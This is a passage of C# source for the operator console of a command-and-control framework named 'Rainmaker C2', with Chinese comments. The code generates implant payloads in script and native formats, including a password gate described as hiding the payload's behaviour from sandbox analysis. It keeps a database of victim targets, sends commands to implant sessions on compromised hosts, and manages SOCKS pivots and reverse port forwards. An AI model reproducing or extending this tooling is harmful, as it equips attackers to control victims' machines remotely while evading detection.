                // 的文件躺在服务端的工作目录里 —— 报成功, 但谁也找不到。
                //
                // 所以"输出路径"从今天起是**客户端的保存路径**, 服务端只负责生成与回传。
                if (ok)
                {
                    string b64 = root.Str("data_b64");
                    if (!string.IsNullOrEmpty(b64))
                    {
                        try
                        {
                            byte[] blob = Convert.FromBase64String(b64);
                            string dest = outFile;
                            if (string.IsNullOrEmpty(dest))
                            {
                                string fn = root.Str("file");
                                if (string.IsNullOrEmpty(fn)) fn = fmt + "_payload.bin";
                                dest = Path.Combine(_devRoot, "build", "payload", fn);
                            }
                            string dir = Path.GetDirectoryName(dest);
                            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
                            File.WriteAllBytes(dest, blob);

                            string sha = root.Str("sha256");
                            GenLine("");
                            GenLine("[+] 已保存到本机: " + dest);
                            GenLine("    " + blob.Length + " 字节" + (sha.Length >= 16 ? ", sha256 " + sha.Substring(0, 16) : ""));
                            SetStatus("载荷已生成并保存: " + Path.GetFileName(dest));
                        }
                        catch (Exception ex)
                        {
                            // 保存失败只报错, 不改判 ok —— 服务端那边确实生成成功了
                            GenLine("[!] 保存到本机失败: " + ex.Message);
                            SetStatus("载荷已生成, 但保存到本机失败");
                        }
                    }
                }

                // 口令明文掩码后再逐行显示: [口令门控] 已启用那两行照原样保留, 只把口令换掉
                string shown = MaskPwd(log, password);
                if (!string.IsNullOrEmpty(shown))
                {
                    foreach (string raw in shown.Split('\n'))
                    {
                        GenLine(raw.TrimEnd('\r'));
                    }
                    // Go 把非 UTF-8 字节写进 JSON 字符串时会替换为 U+FFFD, 不可逆
                    if (shown.IndexOf('\uFFFD') >= 0)
                    {
                        GenLine("[!] 服务端回传文本含替换字符 U+FFFD: PowerShell 输出不是 UTF-8, 其中文已不可逆丢失");
                    }
                }
                if (!string.IsNullOrEmpty(err)) GenLine("[stderr] " + err);

                if (ok)
                {
                    string produced = root.Str("out", outFile);
                    long size = -1;
                    try
                    {
                        if (!string.IsNullOrEmpty(produced) && File.Exists(produced)) size = new FileInfo(produced).Length;
                    }
                    catch { }

                    GenLine("");
                    if (size >= 0)
                    {
                        GenLine("\u2714 生成成功  " + Fmt.Size(size));
                        SetStatus("生成成功: " + produced + "  " + Fmt.Size(size));
                    }
                    else
                    {
                        GenLine("\u2714 生成成功 (服务端未回传本机可校验的产物)");
                        SetStatus("生成成功: " + (produced.Length > 0 ? produced : fmt)
                                  + " (该路径不在本机或服务端未回传, 无法核对大小)");
                    }
                    return true;
                }

                // 降级重试: gen_payload.ps1 未声明 -Sleep / -Jitter, 服务端仍会拼这两个参数
                if (!noSleep && IsParamError(log + " " + err))
                {
                    GenLine("");
                    GenLine("[降级] 服务端生成脚本不接受 -Sleep / -Jitter, 省略这两个参数重试一次");
                    return await BuildOnceAsync(fmt, host, port, ssl, outFile, 0, -1, true, password);
                }

                GenLine("");
                GenLine("\u2718 生成失败" + (err.Length > 0 ? ": " + MaskPwd(err, password) : ""));
                return false;
            }
        }

        /// <summary>
        /// 拉取服务端当前公钥 (GET /api/pubkey), 用于覆写进本地生成载荷的配置槽。
        /// 失败/离线时返回 null —— 生成器会回退到模板编译期公钥。
        /// </summary>
        private async Task<byte[]> FetchServerPubkeyAsync()
        {
            try
            {
                using (var doc = await _api.GetPubkeyAsync())
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok"))
                    {
                        string b64 = root.Str("blob_b64");
                        if (!string.IsNullOrEmpty(b64)) return Convert.FromBase64String(b64);
                    }
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// 客户端本地生成原生格式载荷: 解密内嵌模板 + 覆写配置槽, 产出字节直接落盘到本机。
        ///
        /// 与旧的服务端回传流程对等的三件事: 写日志(口令脱敏)、把 data 落到本机保存路径、
        /// 更新状态栏。差别只有一点 —— 这里没有任何网络往返, 也不依赖服务端是否装 gcc。
        /// </summary>
        private bool GenerateNativeLocally(string fmt, string host, long port, bool ssl,
                                           string outFile, long sleep, long jitter, string password,
                                           byte[] pubkey)
        {
            var res = NativeGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, "raw", password, pubkey);

            GenLine(pubkey != null
                ? "    [公钥] 已用服务端当前公钥 (与 data/csdev.key 同源)"
                : "    [公钥] 未取到服务端公钥, 回退模板编译期公钥 (若回连失败请检查服务端连接)");

            string shown = MaskPwd(res.Log ?? "", password);
            if (!string.IsNullOrEmpty(shown))
            {
                foreach (string raw in shown.Split('\n'))
                {
                    GenLine(raw.TrimEnd('\r'));
                }
            }
            if (res.Error != null)
            {
                GenLine("[stderr] " + res.Error);
                GenLine("");
                GenLine("\u2718 生成失败: " + MaskPwd(res.Error, password));
                SetStatus("生成失败: " + res.Error);
                return false;
            }

            string dest = outFile;
            if (string.IsNullOrEmpty(dest))
            {
                dest = Path.Combine(_devRoot, "build", "payload", res.FileName);
            }
            try
            {
                string dir = Path.GetDirectoryName(dest);
                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
                File.WriteAllBytes(dest, res.Blob);
            }
            catch (Exception ex)
            {
                GenLine("[!] 保存到本机失败: " + ex.Message);
                SetStatus("载荷已生成, 但保存到本机失败");
                return false;
            }

            GenLine("");
            GenLine("[+] 已保存到本机: " + dest);
            GenLine("    " + res.Blob.Length + " 字节, sha256 " + (res.Sha256.Length >= 16 ? res.Sha256.Substring(0, 16) : res.Sha256));
            if (!string.IsNullOrEmpty(password))
            {
                GenLine("    [口令门控] 已启用 — 启动时必须带口令参数, 例如: <样本> <你的口令>");
                GenLine("               也可用环境变量 CSDEV_TOKEN=<口令> 启动");
                GenLine("               直接双击/无参数运行会安静退出 (沙箱自动化检测看不到任何行为)");
            }
            GenLine("");
            GenLine("\u2714 生成成功  " + Fmt.Size(res.Blob.Length));
            SetStatus("生成成功: " + Path.GetFileName(dest) + "  " + Fmt.Size(res.Blob.Length));
            return true;
        }

        /// <summary>
        /// 客户端本地生成脚本类格式载荷 (ps1/vba/vbs/cs/hta): 内嵌载体用原生模板,
        /// base64 后包进脚本模板, 零 gcc / 零 PowerShell / 零服务端依赖。
        /// </summary>
        private bool GenerateScriptLocally(string fmt, string host, long port, bool ssl,
                                           string outFile, long sleep, long jitter, string password,
                                           byte[] pubkey)
        {
            var res = ScriptGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, password, pubkey);

            GenLine(pubkey != null
                ? "    [公钥] 已用服务端当前公钥 (与 data/csdev.key 同源)"
                : "    [公钥] 未取到服务端公钥, 回退模板编译期公钥");

            string shown = MaskPwd(res.Log ?? "", password);
            if (!string.IsNullOrEmpty(shown))
            {
                foreach (string raw in shown.Split('\n')) GenLine(raw.TrimEnd('\r'));
            }
            if (res.Error != null)
            {
                GenLine("[stderr] " + res.Error);
                GenLine("");
                GenLine("\u2718 生成失败: " + MaskPwd(res.Error, password));
                SetStatus("生成失败: " + res.Error);
                return false;
            }

            string dest = outFile;
            if (string.IsNullOrEmpty(dest))
            {
                dest = Path.Combine(_devRoot, "build", "payload", res.FileName);
            }
            try
            {
                string dir = Path.GetDirectoryName(dest);
                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
                File.WriteAllBytes(dest, res.Bytes);
            }
            catch (Exception ex)
            {
                GenLine("[!] 保存到本机失败: " + ex.Message);
                SetStatus("载荷已生成, 但保存到本机失败");
                return false;
            }

            GenLine("");
            GenLine("[+] 已保存到本机: " + dest);
            GenLine("    " + res.Bytes.Length + " 字节 (脚本文本)");
            if (!string.IsNullOrEmpty(password))
            {
                GenLine("    [口令门控] 已启用 — 运行时需带口令");
            }
            GenLine("");
            GenLine("\u2714 生成成功");
            SetStatus("生成成功: " + Path.GetFileName(dest));
            return true;
        }

        /// <summary>
        /// 判断失败是不是"PowerShell 不认识 -Sleep/-Jitter 这两个参数"。
        ///
        /// 只认参数绑定错误的**特征短语**。曾经的实现只要日志里出现 "Sleep"/"Jitter"
        /// 字样就返回 true —— 但生成器**成功输出**里本来就写着 "sleep 5000 ms, jitter 10%"，
        /// 于是任何失败(例如脚本因编码问题解析不了)都会被误判成参数问题并触发降级重试，
        /// 把真正的错误盖掉。
        /// </summary>
        internal static bool IsParamError(string s)
        {
            if (string.IsNullOrEmpty(s)) return false;
            bool bindError = s.IndexOf("parameter cannot be found", StringComparison.OrdinalIgnoreCase) >= 0
                          || s.IndexOf("NamedParameterNotFound", StringComparison.OrdinalIgnoreCase) >= 0
                          || s.IndexOf("\u627e\u4e0d\u5230\u4e0e\u53c2\u6570\u540d\u79f0", StringComparison.Ordinal) >= 0;
            if (!bindError) return false;
            return s.IndexOf("Sleep", StringComparison.OrdinalIgnoreCase) >= 0
                || s.IndexOf("Jitter", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        // ------------------------------------------------------------ 目标库

        private static int CountVisible(System.ComponentModel.ICollectionView view, int fallback)
        {
            if (view == null) return fallback;
            int n = 0;
            var en = view.GetEnumerator();
            while (en.MoveNext()) n++;
            return n;
        }

        private void UpdateTargetCount()
        {
            string q = (TargetFilter.Text ?? "").Trim();
            if (q.Length == 0)
            {
                TargetCount.Text = _targets.Count + " 条";
                return;
            }
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_targets);
            TargetCount.Text = CountVisible(view, _targets.Count) + " / " + _targets.Count
                               + " 条（过滤 " + q + "）";
        }

        /// <summary>纯客户端过滤 (不请求服务端): host / ip / note 三字段模糊匹配。</summary>
        private void TargetFilter_TextChanged(object sender, TextChangedEventArgs e)
        {
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridTargets.ItemsSource);
            if (view != null)
            {
                string q = (TargetFilter.Text ?? "").Trim();
                if (q.Length == 0)
                {
                    view.Filter = null;
                }
                else
                {
                    view.Filter = delegate(object o)
                    {
                        var it = o as TargetRow;
                        if (it == null) return false;
                        return TargetParse.Match(it.Host, it.Ip, it.Note, q);
                    };
                }
            }
            UpdateTargetCount();
        }

        private void TargetFilterClear_Click(object sender, RoutedEventArgs e)
        {
            TargetFilter.Text = "";
        }

        private async void TargetRefresh_Click(object sender, RoutedEventArgs e)
        {
            await PollAsync();
            SetStatus("目标库已刷新: " + _targets.Count + " 条 (GET /api/state.targets)");
        }

        private TargetRow TargetTarget()
        {
            return _ctxTarget ?? GridTargets.SelectedItem as TargetRow;
        }

        private void GridTargets_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null)
            {
                dr.IsSelected = true;
                _ctxTarget = dr.Item as TargetRow;
            }
        }

        private async void TargetAdd_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new TargetDialog();
            dlg.Owner = this;
            dlg.Submit = SubmitNewTargetAsync;
            if (dlg.ShowDialog() != true) return;

            await PollAsync();      // 立刻刷新, 不等下一个 tick
            TargetHint.Text = "已登记目标 " + dlg.HostValue + "  (POST /api/targets)";
            SetStatus("目标已登记: " + dlg.HostValue);
        }

        /// <summary>
        /// 新增目标提交。返回空串 = 成功 (对话框关闭); 非空 = 要原样显示的服务端 error。
        /// </summary>
        private async Task<string> SubmitNewTargetAsync(TargetDialog dlg)
        {
            try
            {
                using (var doc = await _api.AddTargetAsync(dlg.HostValue, dlg.IpValue, dlg.OsValue, dlg.NoteValue))
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok")) return "";
                    return root.Str("error", "服务端返回 ok=false 但未给出 error 字段");
                }
            }
            catch (Exception ex)
            {
                return "请求失败: " + ex.Message;
            }
        }

        private async void TargetDelete_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetTarget();
            if (row == null) { SetStatus("请先选择一行目标"); return; }
            if (row.Id <= 0) { SetStatus("该目标没有 id (服务端未回传), 无法删除"); return; }

            var ans = MessageBox.Show(this,
                "删除目标 #" + row.Id + "  " + row.Host + " ?\n\n"
                + "POST /api/targets {delete: " + row.Id + "}\n"
                + "仅从服务端目标库移除该条记录, 不影响该主机上的会话与其它数据。该操作不可撤销。",
                "Rainmaker C2 控制台  二次确认", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) { SetStatus("已取消删除目标"); return; }

            try
            {
                using (var doc = await _api.DeleteTargetAsync(row.Id))
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok"))
                    {
                        SetStatus("已删除目标 #" + row.Id + "  " + row.Host);
                        await PollAsync();
                    }
                    else
                    {
                        SetStatus("删除目标失败: " + root.Str("error", "服务端未返回原因"));
                    }
                }
            }
            catch (Exception ex)
            {
                SetStatus("删除目标失败 (网络): " + ex.Message);
            }
        }

        private void TargetCtxCopyHost_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetTarget();
            if (row == null) { SetStatus("请先选择一行目标"); return; }
            CopyToClipboard(row.Host, "主机名");
        }

        private void TargetCtxCopyInfo_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetTarget();
            if (row == null) { SetStatus("请先选择一行目标"); return; }
            var sb = new StringBuilder();
            sb.AppendLine("id     : " + row.Id);
            sb.AppendLine("kind   : " + row.Kind);
            sb.AppendLine("host   : " + row.Host);
            sb.AppendLine("ip     : " + row.IpText);
            sb.AppendLine("os     : " + row.OsText);
            sb.AppendLine("source : " + row.SourceText);
            sb.AppendLine("sid    : " + row.SidText);
            sb.AppendLine("note   : " + row.NoteText);
            sb.AppendLine("ts     : " + row.TsText);
            CopyToClipboard(sb.ToString(), "目标信息");
        }

        private async void TargetCtxCmd_Click(object sender, RoutedEventArgs e)
        {
            var row = TargetTarget();
            if (row == null) { SetStatus("请先选择一行目标"); return; }
            await TargetSendCommandAsync(row);
        }

        private async void GridTargets_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = GridTargets.SelectedItem as TargetRow;
            if (row == null) return;
            await TargetSendCommandAsync(row);
        }

        private SessionRow FindSession(string sid)
        {
            if (string.IsNullOrEmpty(sid)) return null;
            for (int i = 0; i < _sessions.Count; i++)
            {
                if (string.Equals(_sessions[i].Sid, sid, StringComparison.Ordinal)) return _sessions[i];
            }
            return null;
        }

        /// <summary>
        /// 把命令发到该目标绑定的会话。
        ///
        /// sid 为空、或 sid 不在当前会话表内 (= 离线) 时只提示, 不猜也不改投其它会话 ——
        /// 目标库允许保留历史主机, 猜错会话等于把命令下到别的机器上。
        /// </summary>
        private async Task TargetSendCommandAsync(TargetRow t)
        {
            if (t == null) return;

            SessionRow sess = FindSession(t.Sid);
            if (t.Sid.Length == 0 || sess == null)
            {
                TargetHint.Text = "该目标没有在线会话: " + t.Host
                                  + (t.Sid.Length == 0
                                        ? "  (targets.sid 为空)"
                                        : "  (targets.sid=" + t.Sid + " 不在当前会话表内)")
                                  + "。等该主机以 v2 会话上线后重试, 或先在「会话」页选中目标会话再下发。";
                SetStatus("该目标没有在线会话");
                return;
            }

            // 命令面板里已经有内容时直接用它 (任务语义: 把命令面板的输入发到那个会话);
            // 空面板才弹输入框, 免得右键目标时还得先切回会话页敲命令。
            string cmd = (CmdInput.Text ?? "").Trim();
            if (cmd.Length == 0)
            {
                cmd = PromptText("对该目标发起命令",
                    "目标: " + t.Host + (t.Ip.Length > 0 ? "  (" + t.Ip + ")" : "") + "\n"
                    + "会话: " + sess.Sid + "  " + sess.User + "@" + sess.Host + "  proto=" + sess.Proto + "\n"
                    + "输入要下发的命令 (与该会话植入体的原生命令集一致):", "");
                if (cmd.Length == 0) { SetStatus("已取消: 命令为空"); return; }
            }
            else
            {
                // 与终端发送保持一致: 取走后清面板并入历史, 避免切回会话页时误重发
                CmdInput.Clear();
                _hist.Add(cmd);
                _histIdx = _hist.Count;
            }
            if (DataBusyLocked()) { SetStatus("正在等待上一条命令回传, 请稍候再下发"); return; }

            // 附着到目标会话: 回传直接显示在该会话终端, 附着态与终端标题保持一致
            if (!string.Equals(_curSid, sess.Sid, StringComparison.Ordinal)) SelectSession(sess, true);
            TabSessions.IsSelected = true;

            var r = await SendWaitAsync(sess.Sid, cmd, true, 2500);
            if (r.Ok)
            {
                TargetHint.Text = "已下发到 " + sess.Sid + " (" + t.Host + "): " + cmd
                                  + "   回传: " + Flatten(r.Raw);
                SetStatus("已下发并收到回传: " + cmd);
            }
            else
            {
                TargetHint.Text = "已下发到 " + sess.Sid + " (" + t.Host + "): " + cmd + "   结果: " + r.Error;
                SetStatus("目标命令: " + r.Error);
            }
        }

        /// <summary>
        /// 导出目标库 CSV。服务端 /api/targets/csv 回的是 UTF-8 带 BOM 的字节流,
        /// 因此按字节原样落盘 (不走字符串, 避免二次转码破坏 BOM 与中文)。
        /// </summary>
        private async void TargetExport_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                byte[] data = await _api.GetTargetsCsvAsync();
                if (data == null || data.Length == 0)
                {
                    SetStatus("导出取消: GET /api/targets/csv 返回空内容");
                    return;
                }

                var dlg = new Microsoft.Win32.SaveFileDialog();
                dlg.Title = "导出目标库 CSV";
                dlg.Filter = "CSV 文件 (*.csv)|*.csv|全部文件 (*.*)|*.*";
                dlg.FileName = "csdev_targets_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".csv";
                if (dlg.ShowDialog(this) != true) { SetStatus("已取消导出目标库"); return; }

                File.WriteAllBytes(dlg.FileName, data);
                bool bom = data.Length >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF;
                string tail = "  (" + data.Length + " 字节" + (bom ? ", 含 UTF-8 BOM" : ", 未见 BOM") + ")";
                SetStatus("已导出目标库 CSV: " + dlg.FileName + tail);
                TargetHint.Text = "已导出 " + _targets.Count + " 条目标 -> " + dlg.FileName + tail;
            }
            catch (Exception ex)
            {
                SetStatus("导出目标库 CSV 失败: " + ex.Message);
            }
        }

        // ------------------------------------------------------------ 代理枢轴

        /// <summary>把一行信息写进代理页提示区 (不弹框, 保留历史)。</summary>
        private void ProxyWrite(string text)
        {
            if (string.IsNullOrEmpty(text)) return;
            if (ProxyMsg.Text.StartsWith("就绪", StringComparison.Ordinal)) ProxyMsg.Clear();
            ProxyMsg.AppendText("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + text + "\n");
            ProxyMsg.ScrollToEnd();
        }

        private async void ProxyRefresh_Click(object sender, RoutedEventArgs e)
        {
            await PollAsync();
            SetStatus("代理状态已刷新: SOCKS " + _socks.Count + " 个 / rportfwd " + _rports.Count + " 个");
        }

        private void GridSocks_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null) dr.IsSelected = true;
        }

        private void GridRports_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            var dr = FindAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
            if (dr != null) dr.IsSelected = true;
        }

        private void ProxyStart_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new ProxyDialog("socks", _sessions, CurrentSessionRow());
            dlg.Owner = this;
            dlg.Submit = SubmitProxyStartAsync;
            dlg.ShowDialog();
        }

        private async void ProxyStop_Click(object sender, RoutedEventArgs e)
        {
            var row = GridSocks.SelectedItem as SocksRow;
            if (row == null) { SetStatus("请先在上表选择一条 SOCKS 入口"); return; }
            await StopSocksAsync(row);
        }

        private void RportStart_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new ProxyDialog("rportfwd", _sessions, CurrentSessionRow());
            dlg.Owner = this;
            dlg.Submit = SubmitRportStartAsync;
            dlg.ShowDialog();
        }

        private async void RportStop_Click(object sender, RoutedEventArgs e)
        {
            var row = GridRports.SelectedItem as RportRow;
            if (row == null) { SetStatus("请先在下表选择一条 rportfwd"); return; }
            await StopRportAsync(row);
        }

        /// <summary>启动 SOCKS 提交。返回空串 = 成功 (对话框关闭); 非空 = 原样显示的服务端 error。</summary>
        private async Task<string> SubmitProxyStartAsync(ProxyDialog dlg)
        {
            try
            {
                using (var doc = await _api.ProxyStartAsync(dlg.SidValue, dlg.PortValue))
                {
                    var root = doc.RootElement;
                    if (!root.Bool("ok")) return root.Str("error", "服务端返回 ok=false 但未给出 error 字段");

                    long port = root.Long("port", dlg.PortValue);
                    string msg = root.Str("message");
                    // 服务端 usage 缺失时按同格式本地补一份 (go/proxy.go handleProxyStart)
                    string usage = TargetParse.UsageText(root.Str("usage"), port);
                    string key = TargetParse.RunKey(dlg.SidValue, port);
                    if (usage.Length > 0) _proxyUsage[key] = usage;

                    ProxyWrite("SOCKS 启动: " + TargetParse.Or(msg, "(服务端未回 message)"));
                    ProxyWrite("usage: " + TargetParse.Or(usage, "(端口未知, 无法拼 usage)"));
                    SetStatus("SOCKS 已启动: " + TargetParse.Or(msg, dlg.SidValue + " :" + port));
                    await PollAsync();
                    return "";
                }
            }
            catch (Exception ex)
            {
                return "请求失败: " + ex.Message;
            }
        }

        /// <summary>启动 rportfwd 提交。</summary>
        private async Task<string> SubmitRportStartAsync(ProxyDialog dlg)
        {
            try
            {
                using (var doc = await _api.RportfwdStartAsync(dlg.SidValue, dlg.PortValue, dlg.TargetValue))
                {
                    var root = doc.RootElement;
                    if (!root.Bool("ok")) return root.Str("error", "服务端返回 ok=false 但未给出 error 字段");

                    string msg = root.Str("message");
                    ProxyWrite("rportfwd 启动: " + TargetParse.Or(msg, "(服务端未回 message)"));
                    SetStatus("rportfwd 已下发: " + TargetParse.Or(msg, dlg.SidValue + " :" + dlg.PortValue));
                    await PollAsync();
                    return "";
                }
            }
            catch (Exception ex)
            {
                return "请求失败: " + ex.Message;
            }
        }

        private async Task StopSocksAsync(SocksRow row)
        {
            if (row.ValidPort <= 0)
            {
                SetStatus("该条目端口非法, 无法停止: " + row.PortText);
                return;
            }
            try
            {
                using (var doc = await _api.ProxyStopAsync(row.Sid, row.ValidPort))
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok"))
                    {
                        ProxyWrite("SOCKS 已停止: " + row.Sid + " :" + row.PortText
                                   + "  (POST /api/proxy/stop)");
                        SetStatus("SOCKS 已停止: " + row.Sid + " :" + row.PortText);
                        await PollAsync();
                    }
                    else
                    {
                        SetStatus("停止 SOCKS 失败: " + root.Str("error", "服务端未返回原因"));
                    }
                }
            }
            catch (Exception ex)
            {
                SetStatus("停止 SOCKS 失败 (网络): " + ex.Message);
            }
        }

        /// <summary>
        /// 停止反向端口转发。端点必须是 /api/proxy/rportfwd/stop:
        /// 反向运行在服务端 proxyRuns 里的键是 "reverse:sid", 走 /api/proxy/stop
        /// 只会去查 sid:port 而报"未找到 SOCKS 入口"(go/proxy.go, 只读核对)。
        /// </summary>
        private async Task StopRportAsync(RportRow row)
        {
            if (row.ValidPort <= 0)
            {
                SetStatus("该条目端口非法, 无法停止: " + row.PortText);
                return;
            }
            try
            {
                using (var doc = await _api.RportfwdStopAsync(row.Sid, row.ValidPort))
                {
                    var root = doc.RootElement;
                    if (root.Bool("ok"))
                    {
                        ProxyWrite("rportfwd 已停止: "
                                   + TargetParse.RportText(row.Sid, row.Port, row.Target)
                                   + "  (POST /api/proxy/rportfwd/stop)");
                        SetStatus("rportfwd 已停止: " + row.Sid + " :" + row.PortText);
                        await PollAsync();
                    }
                    else
                    {
                        SetStatus("停止 rportfwd 失败: " + root.Str("error", "服务端未返回原因"));
                    }
                }
            }
            catch (Exception ex)
            {
                SetStatus("停止 rportfwd 失败 (网络): " + ex.Message);
            }
        }

        private void SocksCtxCopyUsage_Click(object sender, RoutedEventArgs e)
        {
            var row = GridSocks.SelectedItem as SocksRow;
            if (row == null) { SetStatus("请先在上表选择一条 SOCKS 入口"); return; }

            string usage;
            bool fromServer = _proxyUsage.TryGetValue(TargetParse.RunKey(row.Sid, row.Port), out usage)
                              && !string.IsNullOrEmpty(usage);
            if (!fromServer) usage = TargetParse.UsageText("", row.Port);
            if (usage.Length == 0) { SetStatus("该条目端口未知, 无法生成用法提示"); return; }

            CopyToClipboard(usage, fromServer ? "用法提示 (服务端返回)" : "用法提示 (本地按服务端格式生成)");
        }

        private async void SocksCtxStop_Click(object sender, RoutedEventArgs e)
        {
            var row = GridSocks.SelectedItem as SocksRow;
            if (row == null) { SetStatus("请先在上表选择一条 SOCKS 入口"); return; }
            await StopSocksAsync(row);
        }

        private void RportCtxCopy_Click(object sender, RoutedEventArgs e)
        {
            var row = GridRports.SelectedItem as RportRow;
            if (row == null) { SetStatus("请先在下表选择一条 rportfwd"); return; }
            CopyToClipboard(TargetParse.RportText(row.Sid, row.Port, row.Target), "rportfwd 条目");
        }

        private async void RportCtxStop_Click(object sender, RoutedEventArgs e)
        {
            var row = GridRports.SelectedItem as RportRow;
            if (row == null) { SetStatus("请先在下表选择一条 rportfwd"); return; }
            await StopRportAsync(row);
        }

        // ------------------------------------------------------------ 脚本插件
        //
        // 数据源: GET /api/scripts (menus / menubar / commands / loaded / missing / diag / output)。
        // 轮询约定不变: 仍然只有 _poll 这一个 2 秒网络定时器 —— 用 /api/state.scripts 的摘要
        // 签名 (loaded 计数 / menus 计数 / commands 列表) 做差分, 变化时才补拉一次全量脚本信息。
        // 执行走 POST /api/script/run, 服务端把 sid 放在第一位实参, 即 $1 = 会话号。

        private const string ScriptTag = "script:";

        private readonly ObservableCollection<ScriptFileRow> _scriptFiles = new ObservableCollection<ScriptFileRow>();
        private readonly ObservableCollection<ScriptCmdRow> _scriptCmds = new ObservableCollection<ScriptCmdRow>();
        private readonly ObservableCollection<ScriptTextRow> _scriptMissing = new ObservableCollection<ScriptTextRow>();
        private readonly ObservableCollection<ScriptTextRow> _scriptDiag = new ObservableCollection<ScriptTextRow>();
        private readonly ObservableCollection<ScriptTextRow> _scriptOut = new ObservableCollection<ScriptTextRow>();

        private ScriptSummary _scripts = new ScriptSummary();
        private string _scriptStateSig = "\u0000";  // /api/state.scripts 摘要签名 (差分触发)
        private string _scriptTreeSig = "\u0000";   // 菜单树签名 (相同就不重建树, 保住展开态)
        private bool _scriptBusy;                   // GET /api/scripts 防重入
        private bool _scriptOnce;                   // 是否成功拉过全量
        private string _scriptMsg = "";             // 最近一次拉取 / 执行的如实结果

        /// <summary>构造函数里绑定脚本视图的集合 (与其它标签页同一套 Skill 差分刷新)。</summary>
        private void InitScriptView()
        {
            GridScriptFiles.ItemsSource = _scriptFiles;
            GridScriptCmds.ItemsSource = _scriptCmds;
            ListScriptMissing.ItemsSource = _scriptMissing;
            ListScriptDiag.ItemsSource = _scriptDiag;
            ListScriptOut.ItemsSource = _scriptOut;
            SetScriptHint("菜单树来自 GET /api/scripts.menus；会话/进程/目标库右键会挂载对应 parent 的插件菜单。");
        }

        private void SetScriptHint(string msg)
        {
            ScriptHint.Text = msg ?? "";
            ScriptHint.ToolTip = ScriptHint.Text;
        }

        /// <summary>
        /// /api/state.scripts 只是摘要 (loaded 计数 / commands / menus 计数), 菜单树在
        /// GET /api/scripts。签名变化才拉全量 —— 这样菜单不陈旧, 也不多出网络定时器。
        /// 服务端未返回 scripts 块时 (旧版) 不主动拉取, 页面如实显示"未提供"。
        /// </summary>
        private void ApplyScriptSummary(JsonElement root)
        {
            string sig = ScriptParse.StateSignature(root);
            if (sig.Length == 0)
            {
                if (!_scriptOnce)
                {
                    ScriptStat.Text = "服务端未返回 /api/state.scripts —— 插件菜单不可用";
                    SetScriptHint("GET /api/state 里没有 scripts 字段 (可能是旧版服务端)。仍可用『刷新』直接试 GET /api/scripts。");
                }
                return;
            }
            if (sig == _scriptStateSig) return;
            _scriptStateSig = sig;
            _ = FetchScriptsAsync(false);
        }

        /// <summary>拉全量脚本信息 (菜单树 / 命令 / 诊断 / 输出)。失败原因如实进 diag 列。</summary>
        private async Task FetchScriptsAsync(bool announce)
        {
            if (_scriptBusy) return;
            _scriptBusy = true;
            try
            {
                using (var doc = await _api.GetScriptsAsync())
                {
                    _scripts = ScriptParse.Parse(doc.RootElement);
                    if (!_scripts.Present)
                        throw new InvalidOperationException("响应不是 JSON 对象 (无法解析 menus/commands)");
                    _scriptOnce = true;
                    ApplyScripts(_scripts, "");
                    if (announce)
                    {
                        _scriptMsg = "已刷新: 脚本 " + _scripts.Loaded.Count + " / 命令 " + _scripts.Commands.Count
                                   + " / 菜单项 " + _scripts.TotalItems;
                        SetStatus(_scriptMsg);
                        SetScriptHint(_scriptMsg);
                    }
                }
            }
            catch (Exception ex)
            {
                ApplyScripts(_scripts, ex.Message);
                if (announce) SetStatus("脚本刷新失败: " + ex.Message);
            }
            finally
            {
                _scriptBusy = false;
            }
        }

        /// <summary>把解析结果灌进脚本视图 (列表走 Sync 差分, 树只在结构变化时重建)。</summary>
        private void ApplyScripts(ScriptSummary s, string err)
        {
            // 已加载脚本
            var files = new List<ScriptFileRow>();
            for (int i = 0; i < s.Loaded.Count; i++)
            {
                var r = new ScriptFileRow();
                r.Path = s.Loaded[i];
                r.Name = ScriptFileRow.BaseName(s.Loaded[i]);
                if (r.Name.Length == 0) r.Name = s.Loaded[i];
                files.Add(r);
            }
            Sync(_scriptFiles, files);
            ScriptFileTitle.Text = "已加载脚本 " + files.Count;
            GridScriptFiles.ToolTip = files.Count == 0 ? "(无脚本)" : string.Join("\n", s.Loaded.ToArray());

            // 注册命令
            var cmds = new List<ScriptCmdRow>();
            for (int i = 0; i < s.Commands.Count; i++)
            {
                var r = new ScriptCmdRow();
                r.Name = s.Commands[i];
                r.Hit = ScriptParse.CmdHitText(s, s.Commands[i]);
                cmds.Add(r);
            }
            Sync(_scriptCmds, cmds);
            ScriptCmdTitle.Text = "注册命令 " + cmds.Count + " (双击执行)";

            // 菜单树: 结构没变就不动 ItemsSource, 保住展开/选中
            string tsig = ScriptParse.TreeSignature(s);
            if (tsig != _scriptTreeSig)
            {
                _scriptTreeSig = tsig;
                TreeScriptMenus.ItemsSource = ScriptParse.Roots(s);
            }
            int items = s.ItemCount, menus = s.MenuCount, seps = s.SepCount;
